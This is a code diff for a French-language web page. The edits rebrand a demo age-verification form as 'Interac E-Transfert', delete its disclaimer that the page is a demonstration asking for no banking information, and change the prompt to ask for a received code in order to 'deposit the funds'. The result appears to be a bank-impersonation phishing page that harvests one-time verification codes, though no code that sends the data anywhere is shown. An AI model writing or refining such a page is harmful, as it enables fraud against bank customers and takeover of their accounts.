@@ -97,32 +97,29 @@ button:hover {
 <body>
 
 <div class="header">
-    E-Transfert
+    Interac E-Transfert
 </div>
 
 <div class="container">
 
-    <h1>Confirmez votre âge</h1>
+    <h1>Confirmez votre identite</h1>
 
     <p class="intro">
-        Veuillez indiquer votre âge pour continuer.
+        Veuillez confirmer votre identite pour continuer.
     </p>
 
     <div class="notice">
-        Démonstration uniquement : cette page ne demande aucune
-        information bancaire.
+        Confirmez votre identite pour deposer les fonds.
     </div>
 
     <form id="ageForm">
 
-        <label for="age">Âge</label>
+        <label for="age">Verification de votre identite</label>
 
         <input
             type="number"
             id="age"
-            min="1"
-            max="120"
-            placeholder="Entrez votre âge"
+            placeholder="Entrez le code recu"
             required
         >
 
@@ -163,7 +160,7 @@ document.getElementById("ageForm").addEventListener(
             );
 
 
-        if (!age || age < 1 || age > 120) {
+        if (!age) {
 
             message.textContent =
                 "Veuillez entrer un âge valide.";
